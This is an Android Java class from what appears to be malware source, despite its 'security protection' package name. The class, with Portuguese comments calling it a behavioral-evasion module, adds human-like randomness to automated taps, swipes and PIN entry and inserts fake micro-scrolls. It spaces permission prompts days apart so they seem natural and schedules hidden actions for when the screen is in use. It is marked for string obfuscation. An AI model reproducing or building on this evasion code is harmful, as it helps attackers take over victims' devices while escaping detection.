package com.seguranca.protecao.stealth;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.PowerManager;
import android.util.Log;
import org.lsposed.lsparanoid.Obfuscate;
import java.security.SecureRandom;
import java.util.HashMap;
import java.util.Map;

/**
 * Módulo de evasão comportamental.
 * Humaniza gestos automatizados e gerencia solicitação gradual de permissões.
 */
@Obfuscate
public class BehavioralStealth {

    private static final String TAG = "BS";
    private static final String PREFS_NAME = "bs_prefs";

    private final Context context;
    private final SecureRandom random = new SecureRandom();
    private final SharedPreferences prefs;
    private volatile int stealthLevel = StealthProtocol.MODE_NORMAL;

    // Intervalo mínimo entre solicitações de permissão (em milissegundos)
    private static final long PERMISSION_INTERVAL_NORMAL = 24 * 60 * 60 * 1000L;   // 24h
    private static final long PERMISSION_INTERVAL_STEALTH = 48 * 60 * 60 * 1000L;  // 48h
    private static final long PERMISSION_INTERVAL_PARANOID = 72 * 60 * 60 * 1000L;  // 72h

    // Parâmetros de humanização de gestos
    private static final double CLICK_OFFSET_STDDEV = 3.0;   // Desvio padrão em pixels
    private static final double SWIPE_CURVE_FACTOR = 0.15;    // Fator de curvatura natural
    private static final double DELAY_MEAN = 250.0;           // Delay médio entre ações (ms)
    private static final double DELAY_STDDEV = 80.0;          // Desvio padrão do delay

    public BehavioralStealth(Context context) {
        this.context = context.getApplicationContext();
        this.prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
    }

    /**
     * Humaniza coordenadas de clique adicionando imprecisão natural.
     * Simula a imprecisão do dedo humano ao tocar a tela.
     * @return int[]{newX, newY}
     */
    public int[] humanizeClick(int x, int y) {
        try {
            // Offset gaussiano com desvio de ~3px
            int offsetX = (int) Math.round(random.nextGaussian() * CLICK_OFFSET_STDDEV);
            int offsetY = (int) Math.round(random.nextGaussian() * CLICK_OFFSET_STDDEV);

            int newX = Math.max(0, x + offsetX);
            int newY = Math.max(0, y + offsetY);

            return new int[]{newX, newY};
        } catch (Exception e) {
            return new int[]{x, y};
        }
    }

    /**
     * Humaniza coordenadas de swipe adicionando curvatura natural.
     * Humanos não fazem swipes perfeitamente retos.
     * @return int[]{x1, y1, x2, y2} com variação natural
     */
    public int[] humanizeSwipe(int x1, int y1, int x2, int y2) {
        try {
            // Offset no ponto inicial (dedo toca com imprecisão)
            int startOffsetX = (int) Math.round(random.nextGaussian() * 2.0);
            int startOffsetY = (int) Math.round(random.nextGaussian() * 2.0);

            // Offset no ponto final (dedo levanta com imprecisão)
            int endOffsetX = (int) Math.round(random.nextGaussian() * 4.0);
            int endOffsetY = (int) Math.round(random.nextGaussian() * 4.0);

            // Adiciona leve curvatura perpendicular à direção do swipe
            double dx = x2 - x1;
            double dy = y2 - y1;
            double perpX = -dy * SWIPE_CURVE_FACTOR * (random.nextGaussian() * 0.5 + 0.5);
            double perpY = dx * SWIPE_CURVE_FACTOR * (random.nextGaussian() * 0.5 + 0.5);

            int newX1 = Math.max(0, x1 + startOffsetX);
            int newY1 = Math.max(0, y1 + startOffsetY);
            int newX2 = Math.max(0, x2 + endOffsetX + (int) perpX);
            int newY2 = Math.max(0, y2 + endOffsetY + (int) perpY);

            return new int[]{newX1, newY1, newX2, newY2};
        } catch (Exception e) {
            return new int[]{x1, y1, x2, y2};
        }
    }

    /**
     * Retorna delay humanizado entre ações.
     * Distribuição gaussiana centrada em ~250ms com desvio de 80ms.
     * Mínimo 80ms, máximo 600ms.
     */
    public long getHumanDelay() {
        double delay = DELAY_MEAN + random.nextGaussian() * DELAY_STDDEV;
        return Math.max(80, Math.min(600, (long) delay));
    }

    /**
     * Retorna micro-delay para pausas naturais entre toques rápidos.
     * Usado em sequências de digitação (PIN, texto).
     */
    public long getMicroDelay() {
        double delay = 120.0 + random.nextGaussian() * 40.0;
        return Math.max(50, Math.min(300, (long) delay));
    }

    /**
     * Verifica se já passou tempo suficiente para solicitar nova permissão.
     * Implementa graduation: espaça solicitações para parecer natural.
     */
    public boolean shouldRequestPermission(String permission) {
        try {
            long lastRequest = prefs.getLong("perm_" + permission, 0);
            if (lastRequest == 0) return true; // Nunca solicitou

            long interval;
            switch (stealthLevel) {
                case StealthProtocol.MODE_PARANOID:
                    interval = PERMISSION_INTERVAL_PARANOID;
                    break;
                case StealthProtocol.MODE_STEALTH:
                    interval = PERMISSION_INTERVAL_STEALTH;
                    break;
                default:
                    interval = PERMISSION_INTERVAL_NORMAL;
            }

            return (System.currentTimeMillis() - lastRequest) >= interval;
        } catch (Exception e) {
            return true;
        }
    }

    /**
     * Registra timestamp de solicitação de permissão.
     */
    public void recordPermissionRequest(String permission) {
        try {
            prefs.edit()
                .putLong("perm_" + permission, System.currentTimeMillis())
                .apply();
        } catch (Exception e) {
            Log.e(TAG, "Erro registrando permissão: " + e.getMessage());
        }
    }

    /**
     * Verifica se o dispositivo está em uso ativo (tela ligada e interativa).
     * Para atividade stealth, operações devem coincidir com uso real.
     */
    public boolean isDeviceInUse(Context ctx) {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                return pm.isInteractive();
            }
        } catch (Exception e) {
            Log.e(TAG, "PowerManager erro: " + e.getMessage());
        }
        return true; // Em caso de erro, assume que está em uso
    }

    /**
     * Gera velocidade de swipe humanizada em ms.
     * Swipes mais longos = mais tempo, com variação natural.
     */
    public long getSwipeDuration(int startX, int startY, int endX, int endY) {
        double distance = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));

        // Base: 200ms + 0.5ms por pixel de distância, com variação
        double baseDuration = 200.0 + distance * 0.5;
        double variation = random.nextGaussian() * (baseDuration * 0.15);

        return Math.max(150, Math.min(1200, (long)(baseDuration + variation)));
    }

    /**
     * Gera duração de long press humanizada.
     * Humanos seguram entre 500-1200ms tipicamente.
     */
    public long getLongPressDuration() {
        double duration = 700.0 + random.nextGaussian() * 150.0;
        return Math.max(500, Math.min(1200, (long) duration));
    }

    /**
     * Determina se deve adicionar micro-scroll parasita.
     * ~15% de chance após cada ação para simular comportamento natural.
     */
    public boolean shouldAddParasiticAction() {
        return random.nextDouble() < 0.15;
    }

    /**
     * Gera coordenadas de micro-scroll parasita.
     * Pequeno scroll de 10-50px numa direção aleatória.
     */
    public int[] getParasiticScroll(int currentX, int currentY) {
        int scrollAmount = 10 + random.nextInt(40);
        boolean vertical = random.nextBoolean();

        if (vertical) {
            int direction = random.nextBoolean() ? 1 : -1;
            return new int[]{currentX, currentY, currentX, currentY + (scrollAmount * direction)};
        } else {
            int direction = random.nextBoolean() ? 1 : -1;
            return new int[]{currentX, currentY, currentX + (scrollAmount * direction), currentY};
        }
    }

    public void setStealthLevel(int level) {
        this.stealthLevel = level;
    }
}
